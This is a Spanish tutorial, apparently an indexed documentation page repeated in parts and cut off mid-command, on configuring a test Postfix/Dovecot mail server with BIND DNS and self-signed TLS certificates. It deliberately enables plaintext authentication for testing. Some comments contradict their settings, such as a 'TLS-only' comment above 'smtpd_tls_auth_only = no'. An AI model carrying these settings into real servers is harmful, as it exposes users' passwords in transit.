Name: correo.mymail.com Address: 192 .168.88.13 nslookup 192 .168.88.13 13 .88.168.192.in-addr.arpa name = correo.mymail.com. Prerequisitos A\u00f1adir ip estatica al servidor de correo e indicar donde esta el DNS cat /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface auto lo iface lo inet loopback auto enp1s0 iface enp1s0 inet static address 192 .168.88.13 netmask 255 .255.255.0 gateway 192 .168.88.1 cat /etc/resolv.conf search mymail.com nameserver 192 .168.88.4 Las cuentas de usuario de correo, realmente son usuarios creados en el servidor de correo, asi que creo un par de usuarios para pruebas. root@debmail:~# useradd compras -m root@debmail:~# useradd ventas -m root@debmail:~# passwd compras New password: Retype new password: passwd: password updated successfully root@debmail:~# passwd ventas New password: Retype new password: passwd: password updated successfully Acceso puertos al firewall smtp 25 imap 143 imaps 993 smtps 465 submission 587 pop3 110 syslog-ng Configuraci\u00f3n b\u00e1sica Esta configuraci\u00f3n aportara un servidor de correo inseguro donde las contrase\u00f1as biajaran en texto plano, no se debe utilizar nunca este tipo de configuraci\u00f3n a no ser vque sea exclusivo para pruebas y entendimiento. Instalaci\u00f3n de postfix En la instalaci\u00f3n de postfix pide indicar que tipo de servicio quieres configurar y el dominio: sitio de interner, servidor local... en este caso indicamos sitio de internet, porque quiero que se comunique con otros mx. Si queremos que nuestras direcciones sean example@mymail.com deberemos indicar mymail.com sudo apt install postfix sudo postconf mail_version mail_version = 3 .4.14 De momento nos aseguramos de algunos parametros de la configuraci\u00f3n vim /etc/postfix/main.cf ... # my dominio completo myhostname = correo.mymail.com alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases # my origin a de tener my dominio myorigin = /etc/mailname # my destination a\u00f1adir dominio mymail.com en mi caso mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, locall host relayhost = # a\u00f1ado la red local en la que va a trabajar mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 mailbox_size_limit = 0 recipient_delimiter = + # me aseguro que trabaje en todas las interfaces y protocolos inet_interfaces = all inet_protocols = all # a\u00f1ado maildir como lugar donde se guardaran los correos home_mailbox = Maildir/ Nota : La instrucci\u00f3n home_mailbox = Maildir/ cambia el lugar donde se almacenan los correos, por defecto es /var/mail y con maildir se almacena en el home de cada usuaro en el directorio ~/Maildir Esta instrucci\u00f3n hace un poco mas eficiente el servicio. Me aseguro que el archivo mailname este mi dominio cat /etc/mailname mymail.com Recargo configuraci\u00f3n con los nuevos cambios y visualizo que esten en orden root@debmail:~# systemctl reload postfix root@debmail:~# postconf -n alias_database = hash:/etc/aliases alias_maps = hash:/etc/aliases append_dot_mydomain = no biff = no compatibility_level = 2 home_mailbox = Maildir/ inet_interfaces = all inet_protocols = all mailbox_size_limit = 0 mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, localhost myhostname = correo.mymail.com mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 myorigin = /etc/mailname readme_directory = no recipient_delimiter = + relayhost = smtp_tls_session_cache_database = btree: ${ data_directory } /smtp_scache smtpd_banner = $myhostname ESMTP $mail_name ( Debian/GNU ) smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination smtpd_tls_cert_file = /etc/ssl/certs/ssl-cert-snakeoil.pem smtpd_tls_key_file = /etc/ssl/private/ssl-cert-snakeoil.key smtpd_tls_session_cache_database = btree: ${ data_directory } /smtpd_scache smtpd_use_tls = yes Compruebo funcionamiento postfix Primero compruebo que el puerto de smtp(25) este activo, y que desde otro host pueda aceder por el mismo. # compruebo con netstat puerto abierto root@debmail:~# netstat -nlpt4 Active Internet connections ( only servers ) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0 .0.0.0:25 0 .0.0.0:* LISTEN 10270 /master # establezco una conexi\u00f3n desde otro host al server pi@raspberrypi:~ $ nc -zv 192 .168.88.13 25 Connection to 192 .168.88.13 25 port [ tcp/smtp ] succeeded! Ahora compruebo que puedo enviar mensajes y recibirlos. Instalo mailutils para poder mandar mails desde consola con sendmail sudo apt install mailutils # mando un mail simple desde root al usuario compras echo \"Subject: Correo Maildir 1\" | sendmail compras@mymail.com # los mails se almacenan en: ls /home/compras/Maildir/ cur new tmp # compruebo la llegada del mail al usuario compras cat /home/compras/Maildir/new/1609175551.Vfe01I20cc3M685651.debmail Return-Path: <root@mymail.com> X-Original-To: compras@mymail.com Delivered-To: compras@mymail.com Received: by correo.mymail.com ( Postfix, from userid 0 ) id 5B0B020CC1 ; Mon, 28 Dec 2020 12 :12:31 -0500 ( EST ) Subject: Correo Maildir 1 Message-Id: < 20201228171231 .5B0B020CC1@correo.mymail.com> Date: Mon, 28 Dec 2020 12 :12:31 -0500 ( EST ) From: root <root@mymail.com> En este punto podemos mandar mails desde terminal. Instalaci\u00f3n Dovecot Instalamos Dovecot para que haga de MUA y acceder desde un cliente tipo thunderbird, etc... apt install dovecot-core dovecot-imapd dovecot-pop3d En la configuraci\u00f3n de autentificaci\u00f3n, estamos configurando un server b\u00e1sico e inseguro solo para pruebas, as\u00ed que habilitamos el texto plano en la autenticaci\u00f3n. vim /etc/dovecot/conf.d/10-auth.conf # habilitamos el texto plano ( es muy inseguro !!!) disable_plaintext_auth = no # Este formato recoge el usuario de user@dominio.com auth_username_format = %Ln Indicamos donde guardar la correspondencia, ya que por defecto utiliza mbox. vim /etc/dovecot/conf.d/10-mail.conf # directorio donde guardar la correspondencia mail_location = maildir:~/Maildir # mail_location = mbox:~/mail:INBOX=/var/mail/%u # mail_location = mbox:/var/mail/%d/%1n/%n:INDEX=/var/indexes/%d/%1n/%n #mail_location = mbox:~/mail:INBOX=/var/mail/%u # dar acceso al grupo mail, para las cuentas recien creadas. mail_access_groups = mail Para que clientesvcomo outlook o thunderbird funcionen bien con pop3 necesita descomentar el formato indicado vim /etc/dovecot/conf.d/20-pop3.conf pop3_uidl_format = %08Xu%08Xv Reiniciar servicio systemctl reload dovecot Comprobar funcionamiento Para comprobar el servicio se tiene que instalar thunderbird y acceder al correo desde el cliente de momento no hay certificados y la conexi\u00f3n es muy insegura pero el funcionamiento se puede probar. Configuraci\u00f3n cifrada SASL + TLS La configuraci\u00f3n SASL + TLS (Simple Authentication Security Layer with Transport Layer Security), se utiliza principalmente para autenticar a los usuarios, antes de que env\u00eden correo a un servidor externo. SASL maneja la autenticaci\u00f3n y TLS se encarga de cifrar el contnido del mensaje. generar llaves Si tubieramos un dominio p\u00fablico se podria generar unos certificados con LetsEncrypt o similar, pero al ser un entorno de pruebas nos gisamos nuestros propios certificados. openssl genrsa -des3 -out mymail.key 2048 openssl req -new -key mymail.key -out mymail.csr Enter pass phrase for mymail.key: Organizational Unit Name ( eg, section ) [] :mymail Common Name ( e.g. server FQDN or YOUR name ) [] :*.mymail.com Email Address [] :webadmin@mymail.com openssl x509 -req -days 365 -in mymail.csr -signkey mymail.key -out mymail.crt openssl rsa -in mymail.key -out mymail.key,nopass mv mymail.key,nopass mymail.key openssl req -new -x509 -extensions v3_ca -keyout cakey.pem -out cacert.pem -days 365 # una vez creados los movemos al directorio de ssl mv mymail.key /etc/ssl/private/ mv cakey.pem /etc/ssl/private/ mv mymail.crt /etc/ssl/certs/ mv cacrt.pem /etc/ssl/certs/ Conf postfix Respecto a la configuraci\u00f3n de postfix anterior a\u00f1adimos nuevos parametros para activar el sasl y el tls. # usar certificados propios --------------------- sudo postconf -e 'smtpd_tls_key_file = /etc/ssl/private/mymail.key' sudo postconf -e 'smtpd_tls_cert_file = /etc/ssl/certs/mymail.crt' sudo postconf -e 'smtpd_tls_CAfile = /etc/ssl/certs/cacrt.pem' # opciones de autenticaci\u00f3n sasl ------------------- sudo postconf -e 'smtpd_sasl_auth_enable = yes' # comunicacion con dovecot sudo postconf -e 'smtpd_sasl_type = dovecot' sudo postconf -e 'smtpd_sasl_path = private/auth' # no a\u00f1adir dominio en la autenticacion del user sudo postconf -e 'smtpd_sasl_local_domain =' # no permitir usuarios desconocidos ni contrase\u00f1as en texto plano sudo postconf -e 'smtpd_sasl_security_options = noplaintext,noanonymous' sudo postconf -e 'smtpd_sasl_tls_security_options = $smtpd_sasl_security_options' # a\u00f1ade un separador especifico para los clientes Outlook sudo postconf -e 'broken_sasl_auth_clients = yes' sudo postconf -e 'smtpd_recipient_restrictions = permit_sasl_authenticated,permit_mynetworks,reject_unauth_destination' # configuraci\u00f3n tls ------------------------ sudo postconf -e 'smtpd_use_tls = yes' sudo postconf -e 'smtp_use_tls = yes' # solo admitir comunicaci\u00f3n por tls sudo postconf -e 'smtpd_tls_auth_only = no' # nivel de log sudo postconf -e 'smtpd_tls_loglevel = 1' # incluir informacion de protocolo y nombre comun del cliente en el encabezado sudo postconf -e 'smtpd_tls_received_header = yes' # por defecto la cache es de 300s aumentar a 1h sudo postconf -e 'smtpd_tls_session_cache_timeout = 3600s' Ademas hay que modificar manualmente el archivo master.cf Main.cf Ejemplo de archivo main.cf cat /etc/postfix/main.cf #myorigin = /etc/mailname smtpd_banner = $myhostname ESMTP $mail_name ( Debian/GNU ) biff = no # appending .domain is the MUA's job. append_dot_mydomain = no # Uncomment the next line to generate \"delayed mail\" warnings #delay_warning_time = 4h readme_directory = no # See http://www.postfix.org/COMPATIBILITY_README.html -- default to 2 on # fresh installs. compatibility_level = 2 # TLS parameters smtpd_tls_auth_only = no smtpd_use_tls = yes smtp_use_tls = yes smtp_tls_note_starttls_offer = yes smtpd_tls_key_file = /etc/ssl/private/mymail.key smtpd_tls_cert_file = /etc/ssl/certs/mymail.crt smtpd_tls_CAfile = /etc/ssl/certs/cacrt.pem smtpd_tls_loglevel = 1 smtpd_tls_received_header = yes smtpd_tls_session_cache_timeout = 3600s smtpd_tls_session_cache_database = btree: ${ data_directory } /smtpd_scache smtp_tls_session_cache_database = btree: ${ data_directory } /smtp_scache # See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for # information on enabling SSL in the smtp client. smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination myhostname = correo.mymail.com alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases myorigin = /etc/mailname mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, localhost relayhost = mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 mailbox_size_limit = 0 recipient_delimiter = + inet_interfaces = all inet_protocols = all home_mailbox = Maildir/ mailbox_command = # SASL parameters smtpd_sasl_type = dovecot smtpd_sasl_path = private/auth smtpd_sasl_auth_enable = yes smtpd_sasl_tls_security_options = $smtpd_sasl_security_options smtpd_sasl_security_options = noanonymous smtpd_recipient_restrictions = permit_mynetworks permit_sasl_authenticated reject_unauth_destination Master.cf master.cf submission inet n - y - - smtpd -o smtpd_tls_security_level = encrypt -o smtpd_sasl_auth_enable = yes -o smtpd_sasl_type = dovecot -o smtpd_sasl_path = private/auth -o smtpd_sasl_security_options = noanonymous -o smtpd_sasl_local_domain = mymail.com # -o smtpd_client_restrictions=permit_sasl_authenticated,reject # -o smtpd_sender_login_maps=hash:/etc/postfix/virtual # -o smtpd_sender_restrictions=reject_sender_login_mismatch # -o smtpd_recipient_restrictions=reject_non_fqdn_recipient,reject_unknown_recipient_domain,permit_sasl_authenticated,reject smtps inet n - y - - smtpd -o syslog_name = postfix/smtps -o smtpd_tls_wrappermode = yes -o smtpd_sasl_auth_enable = yes Conf dovecot Secci\u00f3n modificada de archivos de configuraci\u00f3n dovecot. dovecot.conf ... # A comma separated list of IPs or hosts where to listen in for connections. # \"*\" listens in all IPv4 interfaces, \"::\" listens in all IPv6 interfaces. # If you want to specify non-default ports or anything more complex, # edit conf.d/master.conf. listen = *, :: # extender logs para depurar errores ( opcional ) auth_verbose = yes mail_debug = yes ... 10-auth.conf # desabilitar autentificaci\u00f3n en texto plano disable_plaintext_auth = yes # %n eliminar dominio en la autenticaci\u00f3n, %Lu minimizar las mayusculas auth_username_format = %Lu %n # Space separated list of wanted authentication mechanisms: # plain login digest-md5 cram-md5 ntlm rpa apop anonymous gssapi otp skey # gss-spnego # NOTE: See also disable_plaintext_auth setting. auth_mechanisms = plain login 10-mail.conf # utilizar Maildir como buzon mail_location = maildir:~/Maildir #mail_location = mbox:~/mail:INBOX=/var/mail/%u mail_privileged_group = mail 10-master.conf ... service imap-login { inet_listener imap { port = 143 } ... } ... service pop3-login { inet_listener pop3 { port = 110 } ... } ... # Postfix smtp-auth unix_listener /var/spool/postfix/private/auth { mode = 0660 user = postfix group = postfix } ... 10-ssl.conf # SSL/TLS support: yes, no, required. <doc/wiki/SSL.txt> ssl = yes # PEM encoded X.509 SSL/TLS certificate and private key. They're opened before # dropping root privileges, so keep the key file unreadable by anyone but # root. Included doc/mkcert.sh can be used to easily generate self-signed # certificate, just make sure to update the domains in dovecot-openssl.cnf ssl_cert = </etc/ssl/certs/mymail.crt ssl_key = </etc/ssl/private/mymail.key 20-pop3.conf Esta opcion solo en caso de querer utilizar pop3 # Note that Outlook 2003 seems to have problems with %v.%u format which was # Dovecot's default, so if you're building a new server it would be a good # idea to change this. %08Xu%08Xv should be pretty fail-safe. pop3_uidl_format = %08Xu%08Xv Opcional seguridad Requerir un comando HELO o EHLO v\u00e1lido con un nombre de dominio completamente calificado puede hacer precisamente eso sudo postconf -e 'smtpd_helo_required = yes' sudo postconf -e 'smtpd_helo_restrictions = reject_non_fqdn_helo_hostname,reject_invalid_helo_hostname,reject_unknown_helo_hostname' # desabiliar veryfy para evitar exponer conf de usuario sensible sudo postconf -e 'disable_vrfy_command = yes' Tambi\u00e9n es posible que desee retrasar el mensaje de rechazo para permitir que Postfix registre la informaci\u00f3n de la direcci\u00f3n del destinatario cuando el cliente conectado infringe alguna de las reglas de rechazo. Esto le permite averiguar m\u00e1s tarde a qui\u00e9n intentaban apuntar los spammers. sudo postconf -e 'smtpd_delay_reject = yes' Las restricciones de destinatario de Postfix que se establecieron en la parte de configuraci\u00f3n de SASL son importantes para proteger el servidor al tiempo que permiten a los usuarios conectarse con clientes de correo electr\u00f3nico como Thunderbird o Outlook. Mantener estos par\u00e1metros en el orden correcto conservar\u00e1 esta capacidad, pero puede incluir restricciones adicionales que los mensajes entrantes deber\u00e1n cumplir. sudo postconf -e 'smtpd_recipient_restrictions = permit_sasl_authenticated,permit_mynetworks,reject_unauth_destination,reject_invalid_hostname,reject_non_fqdn_hostname,reject_non_fqdn_sender,reject_non_fqdn_recipient,reject_unknown_sender_domain,reject_rbl_client sbl.spamhaus.org,reject_rbl_client cbl.abuseat.org' Los par\u00e1metros anteriores se explican por s\u00ed mismos, aunque un poco dif\u00edciles de leer en un formato de terminal f\u00e1cil de copiar y pegar. La idea general es rechazar las conexiones de direcciones inventadas que no usan un nombre de dominio completo o simplemente no existen. Aqu\u00ed tambi\u00e9n es posible agregar filtros de spam externos como las listas negras de Spamhaus o CBL. Si desea obtener m\u00e1s informaci\u00f3n, Postfix tiene una documentaci\u00f3n muy extensa sobre sus opciones de configuraci\u00f3n. http://www.postfix.org/postconf.5.html#smtpd_recipient_restrictions Comprobar funcionamiento root@debmail:~# openssl s_client -connect correo.mymail.com:993 CONNECTED ( 00000003 ) .... Por aqui en medio sale string sobre el certificado .... * OK [ CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH = PLAIN AUTH = LOGIN ] Dovecot ( Debian ) ready. . login ventas@mymail.com ventas . OK [ CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT = DISPLAY THREAD = REFERENCES THREAD = REFS THREAD = ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL = 1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT = SEARCH LIST-STATUS BINARY MOVE SNIPPET = FUZZY LITERAL+ NOTIFY SPECIAL-USE ] Logged in . select INBOX * FLAGS ( \\A nswered \\F lagged \\D eleted \\S een \\D raft ) * OK [ PERMANENTFLAGS ( \\A nswered \\F lagged \\D eleted \\S een \\D raft \\* )] Flags permitted. * 1 EXISTS * 0 RECENT * OK [ UIDVALIDITY 1609316456 ] UIDs valid * OK [ UIDNEXT 5 ] Predicted next UID . OK [ READ-WRITE ] Select completed ( 0 .033 + 0 .000 + 0 .037 secs ) . . logout * BYE Logging out . OK Logout completed ( 0 .005 + 0 .000 + 0 .005 secs ) . closed","title":"Servidor Correo"},{"location":"administracion/server-correo/#servidor-correo","text":"Para crear este servidor de correo estoy utilizando Postfix, Maildir y Dovecot como cliente utilizo Thunderbird. Este servidor se esta configurando en una maquina virtual Debian10 Buster sobre VirtManager con una configuraci\u00f3n de red Bridge sobre la targeta del Host. +--------+ +--------+ | | | | | | | | Internet | | | | +-----------> | MTA | | MTA | Servidor | | | | | pop3/imap | | | Internet | | +------+ | | | +-----------> | +-------> | MDA | +--+-+ +--------+ +--------+ +---+--+ +----+ | | Servidor MTP Servidor MTP | | | | | | | MUA | | MUA | | | | +----+ +----> +----+ Cliente correo Cliente correo electronico electronico","title":"Servidor Correo"},{"location":"administracion/server-correo/#componentes","text":"MUA ( Mail User Agent ) Thunderbird MTA ( Mail transfer agent ) Postfix postfix transfire correo desde un servidor a otro mediante SMTP MDA ( Mail Delivery Agent ) Devecot Devocot reparte los correos de tu servidor a los usuarios a traves de un cliente en este caso thunderbird POP3/IMAP protocolos de acceso al buzon de correo IMAP accede remotamente al buzon del servidor de correo electronico para leer la correspondencia remotamente POP3 descarga el buzon de correo del servidor, para posteriormente leer el correo de forma local","title":"Componentes"},{"location":"administracion/server-correo/#funcionamiento","text":"Para enviar un correo se utilizax un MUA que lo transfirere a un servidor MTA con el protocolo SMTP El MTA recibe el correo y lo envia al MTA del destinatario utilizando SMTP El MTA destinatario almacena el correo en el buzon correspondiente, funcion que en algunos casos realiza un programa especifico denominado MDA El mensage permanece en el buzon hasta que el destinatario utiliza su MUA para acceder al buzon mediante los protocolos POP o IMAP","title":"Funcionamiento"},{"location":"administracion/server-correo/#configurar-dns","text":"Es necesario configurar un DNS para poder resolver las peticiones de correo en este documento el servidor de correo se encuentra en 192.168.88.13 y el dns en 192.168.88.4 donde la LAN es 192.168.88.0/24 . A la hora de instalar nuestro servidor de correo, tendremos que crear los siguientes registros en el DNS: Un registro de tipo A que apunte a la direcci\u00f3n del servidor de correo. Un registro de tipo PTR, para que funcione la resoluci\u00f3n inversa (necesaria por algunos sistemas para controlar el env\u00edo de SPAM por servidores SMTP. Un registro de tipo MX con la prioridad que deseemos, y que apunte al equipo servidor de correo de nuestro dominio. cat /etc/bind/named.conf.local ... # especificacion de zonas zone \"mymail.com\" { type master ; file \"db.mymail.com\" ; } ; zone \"88.168.192.in-addr.arpa\" { type master ; file \"db.rev.mymail.com\" ; } ;","title":"Configurar DNS"},{"location":"administracion/server-correo/#resolucion-directa-tipo-a-y-mx","text":"cat /var/cache/bind/db.mymail.com $TTL 3600 @ IN SOA server.myail.com. root.mymail.com. ( 2020122001 ; Serial 3600 ; Refresh [ 1h ] 600 ; Retry [ 10m ] 86400 ; Expire [ 1d ] 600 ) ; Negative Cache TTL [ 1h ] ; @ IN NS server.mymail.com. mymail.com. IN MX 10 correo server IN A 192 .168.88.4 torre IN A 192 .168.88.2 portatil IN A 192 .168.88.3 correo IN A 192 .168.88.13","title":"Resoluci\u00f3n directa tipo A y MX"},{"location":"administracion/server-correo/#resolucion-inversa-tipo-ptr","text":"cat /var/cache/bind/db.rev.mymail.com $TTL 3600 @ IN SOA server.mymail.com. root.mymail.com. ( 2020122001 ; Serial 3600 ; Refresh [ 1h ] 600 ; Retry [ 10m ] 86400 ; Expire [ 1d ] 600 ) ; Negative Cache TTL [ 1h ] ; IN NS server.mymail.com. 4 IN PTR server.mymail.com. 3 IN PTR portatil.mymail.com. 2 IN PTR torre.mymail.com. 13 IN PTR correo.mymail.com.","title":"Resoluci\u00f3n inversa tipo PTR"},{"location":"administracion/server-correo/#comprobaciones-dns","text":"Comprobar que la sintaxis es correcta sudo named-checkzone 88 .168.192.in-addr.arpa /var/cache/bind/db.rev.mymail.com zone 88 .168.192.in-addr.arpa/IN: loaded serial 2020122001 OK sudo named-checkzone mymail.com /var/cache/bind/db.mymail.com zone mymail.com/IN: loaded serial 2020122001 OK Comprobar la resoluci\u00f3n de dominio nslookup correo.mymail.com Server: 192 .168.88.4 Address: 192 .168.88.4#53 Name: correo.mymail.com Address: 192 .168.88.13 nslookup 192 .168.88.13 13 .88.168.192.in-addr.arpa name = correo.mymail.com.","title":"Comprobaciones DNS"},{"location":"administracion/server-correo/#prerequisitos","text":"A\u00f1adir ip estatica al servidor de correo e indicar donde esta el DNS cat /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). source /etc/network/interfaces.d/* # The loopback network interface auto lo iface lo inet loopback auto enp1s0 iface enp1s0 inet static address 192 .168.88.13 netmask 255 .255.255.0 gateway 192 .168.88.1 cat /etc/resolv.conf search mymail.com nameserver 192 .168.88.4 Las cuentas de usuario de correo, realmente son usuarios creados en el servidor de correo, asi que creo un par de usuarios para pruebas. root@debmail:~# useradd compras -m root@debmail:~# useradd ventas -m root@debmail:~# passwd compras New password: Retype new password: passwd: password updated successfully root@debmail:~# passwd ventas New password: Retype new password: passwd: password updated successfully Acceso puertos al firewall smtp 25 imap 143 imaps 993 smtps 465 submission 587 pop3 110 syslog-ng","title":"Prerequisitos"},{"location":"administracion/server-correo/#configuracion-basica","text":"Esta configuraci\u00f3n aportara un servidor de correo inseguro donde las contrase\u00f1as biajaran en texto plano, no se debe utilizar nunca este tipo de configuraci\u00f3n a no ser vque sea exclusivo para pruebas y entendimiento.","title":"Configuraci\u00f3n b\u00e1sica"},{"location":"administracion/server-correo/#instalacion-de-postfix","text":"En la instalaci\u00f3n de postfix pide indicar que tipo de servicio quieres configurar y el dominio: sitio de interner, servidor local... en este caso indicamos sitio de internet, porque quiero que se comunique con otros mx. Si queremos que nuestras direcciones sean example@mymail.com deberemos indicar mymail.com sudo apt install postfix sudo postconf mail_version mail_version = 3 .4.14 De momento nos aseguramos de algunos parametros de la configuraci\u00f3n vim /etc/postfix/main.cf ... # my dominio completo myhostname = correo.mymail.com alias_maps = hash:/etc/aliases alias_database = hash:/etc/aliases # my origin a de tener my dominio myorigin = /etc/mailname # my destination a\u00f1adir dominio mymail.com en mi caso mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, locall host relayhost = # a\u00f1ado la red local en la que va a trabajar mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 mailbox_size_limit = 0 recipient_delimiter = + # me aseguro que trabaje en todas las interfaces y protocolos inet_interfaces = all inet_protocols = all # a\u00f1ado maildir como lugar donde se guardaran los correos home_mailbox = Maildir/ Nota : La instrucci\u00f3n home_mailbox = Maildir/ cambia el lugar donde se almacenan los correos, por defecto es /var/mail y con maildir se almacena en el home de cada usuaro en el directorio ~/Maildir Esta instrucci\u00f3n hace un poco mas eficiente el servicio. Me aseguro que el archivo mailname este mi dominio cat /etc/mailname mymail.com Recargo configuraci\u00f3n con los nuevos cambios y visualizo que esten en orden root@debmail:~# systemctl reload postfix root@debmail:~# postconf -n alias_database = hash:/etc/aliases alias_maps = hash:/etc/aliases append_dot_mydomain = no biff = no compatibility_level = 2 home_mailbox = Maildir/ inet_interfaces = all inet_protocols = all mailbox_size_limit = 0 mydestination = $myhostname , mymail.com, localhost, localhost.localdomain, localhost myhostname = correo.mymail.com mynetworks = 192 .168.88.0/24 127 .0.0.0/8 [ ::ffff:127.0.0.0 ] /104 [ ::1 ] /128 myorigin = /etc/mailname readme_directory = no recipient_delimiter = + relayhost = smtp_tls_session_cache_database = btree: ${ data_directory } /smtp_scache smtpd_banner = $myhostname ESMTP $mail_name ( Debian/GNU ) smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_unauth_destination smtpd_tls_cert_file = /etc/ssl/certs/ssl-cert-snakeoil.pem smtpd_tls_key_file = /etc/ssl/private/ssl-cert-snakeoil.key smtpd_tls_session_cache_database = btree: ${ data_directory } /smtpd_scache smtpd_use_tls = yes","title":"Instalaci\u00f3n de postfix"},{"location":"administracion/server-correo/#compruebo-funcionamiento-postfix","text":"Primero compruebo que el puerto de smtp(25) este activo, y que desde otro host pueda aceder por el mismo. # compruebo con netstat puerto abierto root@debmail:~# netstat -nlpt4 Active Internet connections ( only servers ) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0 .0.0.0:25 0 .0.0.0:* LISTEN 10270 /master # establezco una conexi\u00f3n desde otro host al server pi@raspberrypi:~ $ nc -zv 192 .168.88.13 25 Connection to 192 .168.88.13 25 port [ tcp/smtp ] succeeded! Ahora compruebo que puedo enviar mensajes y recibirlos. Instalo mailutils para poder mandar mails desde consola con sendmail sudo apt install mailutils # mando un mail simple desde root al usuario compras echo \"Subject: Correo Maildir 1\" | sendmail compras@mymail.com # los mails se almacenan en: ls /home/compras/Maildir/ cur new tmp # compruebo la llegada del mail al usuario compras cat /home/compras/Maildir/new/1609175551.Vfe01I20cc3M685651.debmail Return-Path: <root@mymail.com> X-Original-To: compras@mymail.com Delivered-To: compras@mymail.com Received: by correo.mymail.com ( Postfix, from userid 0 ) id 5B0B020CC1 ; Mon, 28 Dec 2020 12 :12:31 -0500 ( EST ) Subject: Correo Maildir 1 Message-Id: < 20201228171231 .5B0B020CC1@correo.mymail.com> Date: Mon, 28 Dec 2020 12 :12:31 -0500 ( EST ) From: root <root@mymail.com> En este punto podemos mandar mails desde terminal.","title":"Compruebo funcionamiento postfix"},{"location":"administracion/server-correo/#instalacion-dovecot","text":"Instalamos Dovecot para que haga de MUA y acceder desde un cliente tipo thunderbird, etc... apt install dovecot-core dovecot-imapd dovecot-pop3d En la configuraci\u00f3n de autentificaci\u00f3n, estamos configurando un server b\u00e1sico e inseguro solo para pruebas, as\u00ed que habilitamos el texto plano en la autenticaci\u00f3n. vim /etc/dovecot/conf.d/10-auth.conf # habilitamos el texto plano ( es muy inseguro !!!) disable_plaintext_auth = no # Este formato recoge el usuario de user@dominio.com auth_username_format = %Ln Indicamos donde guardar la correspondencia, ya que por defecto utiliza mbox. vim /etc/dovecot/conf.d/10-mail.conf # directorio donde guardar la correspondencia mail_location = maildir:~/Maildir # mail_location = mbox:~/mail:INBOX=/var/mail/%u # mail_location = mbox:/var/mail/%d/%1n/%n:INDEX=/var/indexes/%d/%1n/%n #mail_location = mbox:~/mail:INBOX=/var/mail/%u # dar acceso al grupo mail, para las cuentas recien creadas. mail_access_groups = mail Para que clientesvcomo outlook o thunderbird funcionen bien con pop3 necesita descomentar el formato indicado vim /etc/dovecot/conf.d/20-pop3.conf pop3_uidl_format = %08Xu%08Xv Reiniciar servicio systemctl reload dovecot","title":"Instalaci\u00f3n Dovecot"},{"location":"administracion/server-correo/#comprobar-funcionamiento","text":"Para comprobar el servicio se tiene que instalar thunderbird y acceder al correo desde el cliente de momento no hay certificados y la conexi\u00f3n es muy insegura pero el funcionamiento se puede probar.","title":"Comprobar funcionamiento"},{"location":"administracion/server-correo/#configuracion-cifrada-sasl-tls","text":"La configuraci\u00f3n SASL + TLS (Simple Authentication Security Layer with Transport Layer Security), se utiliza principalmente para autenticar a los usuarios, antes de que env\u00eden correo a un servidor externo. SASL maneja la autenticaci\u00f3n y TLS se encarga de cifrar el contnido del mensaje.","title":"Configuraci\u00f3n cifrada SASL + TLS"},{"location":"administracion/server-correo/#generar-llaves","text":"Si tubieramos un dominio p\u00fablico se podria generar unos certificados con LetsEncrypt o similar, pero al ser un entorno de pruebas nos gisamos nuestros propios certificados. openssl genrsa -des3 -out mymail.key 2048 openssl req -new -key mymail.key -out mymail.csr Enter pass phrase for mymail.key: Organizational Unit Name ( eg, section ) [] :mymail Common Name ( e.g. server FQDN or YOUR name ) [] :*.mymail.com Email Address [] :webadmin@mymail.com openssl x509 -req -days 365 -in mymail.csr -signkey mymail.key -out mymail.crt openssl rsa -in mymail.key -out mymail.key,nopass mv mymail.key,nopass mymail.key openssl req -new -x509 -extensions v3_ca -keyout cakey.pem -out cacert.pem -days 365 # una vez creados los movemos al directorio de ssl mv mymail.key /etc/ssl/private/ mv cakey.pem /etc/ssl/private/ mv mymail.crt /etc/ssl/certs/ mv cacrt.pem /etc/ssl/certs/","title":"generar llaves"},{"location":"administracion/server-correo/#conf-postfix","text":"Respecto a la configuraci\u00f3n de postfix anterior a\u00f1adimos nuevos parametros para activar el sasl y el tls. # usar certificados propios --------------------- sudo postconf -e 'smtpd_tls_key_file = /etc/ssl/private/mymail.key' sudo postconf -e 'smtpd_tls_cert_file = /etc/ssl/certs/mymail.crt' sudo postconf -e 'smtpd_tls_CAfile = /etc/ssl/certs/cacrt.pem' # opciones de autenticaci\u00f3n sasl ------------------- sudo postconf -e 'smtpd_sasl_auth_enable = yes' # comunicacion con dovecot sudo postconf -e 'smtpd_sasl_type = dovecot' sudo postconf -e 'smtpd_sasl_path = private/auth' # no a\u00f1adir dominio en la autenticacion del user sudo postconf -e 'smtpd_sasl_local_domain =' # no permitir usuarios desconocidos ni contrase\u00f1as en texto plano sudo postconf -e 'smtpd_sasl_security_options = noplaintext,noanonymous' sudo postconf -e 'smtpd_sasl_tls_security_options = $smtpd_sasl_security_options' # a\u00f1ade un separador especifico para los clientes Outlook sudo postconf -e 'broken_sasl_auth_clients = yes' sudo postconf -e 'smtpd_recipient_restrictions = 